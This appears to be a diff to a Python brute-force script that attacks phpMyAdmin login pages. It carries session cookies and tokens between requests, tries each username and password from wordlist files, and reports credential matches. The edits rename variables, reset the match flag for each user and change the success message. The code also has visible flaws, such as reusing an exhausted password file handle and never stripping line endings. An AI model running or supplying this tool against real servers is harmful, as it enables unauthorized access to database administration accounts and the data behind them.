@@ -55,14 +55,14 @@ PASS_FILE = sys.argv[3]
 #INIT_TOKEN = sys.argv[4]
 #INIT_COOKIE = sys.argv[5]
 
-def forge_post(url, token, resp_cookie, username, password):
+def forge_post(url, token, cookie, username, password):
 
     cookie = {
-        "phpMyAdmin":resp_cookie,
+        "phpMyAdmin":cookie,
     }
 
     payload ={
-        "set_session" : resp_cookie,
+        "set_session" : cookie,
         "pma_username" :  username,
         "pma_password" : password,
         "server" : 1,
@@ -89,7 +89,7 @@ def analyze_resp(resp):
 
     if session_match:
         next_cookie = session_match.group(1)
-        print("set_session cookie value:", next_cookie)
+        print("set_session cookie:", next_cookie)
     else:
         return 0
 
@@ -108,9 +108,9 @@ def analyze_resp(resp):
     # search for positive password feedback in html body
 
     pattern_not_failed = re.compile(r'^((?!Login Failed).)*$')
-    log_match = pattern_not_failed.search(resp.text)
+    pass_match = pattern_not_failed.search(resp.text)
 
-    if log_match:
+    if pass_match:
         password_correct = True
 
     return (next_cookie, token, password_correct)
@@ -120,8 +120,7 @@ def analyze_resp(resp):
 
 def main():
 
-    password_correct = False
-    #initialize bruteforce session by sending virgin GET request
+    #initial GET request
     resp = requests.get(URL)
     (cookie, token, password_correct) = analyze_resp(resp)
 
@@ -129,11 +128,14 @@ def main():
         with open(PASS_FILE,"r") as f:
 
             for user in u.readlines():
+                # password match flag
+                password_correct = False
+                
                 for password in f.readlines():
                     resp = forge_post(URL, token, cookie, user, password)
                     (cookie, token, password_correct) = analyze_resp(resp)
                     if password_correct:
-                        print("[+] Pasword found: ", password)
+                        print(f"[+] Password match! {user}:{password}")
                         break
 
 
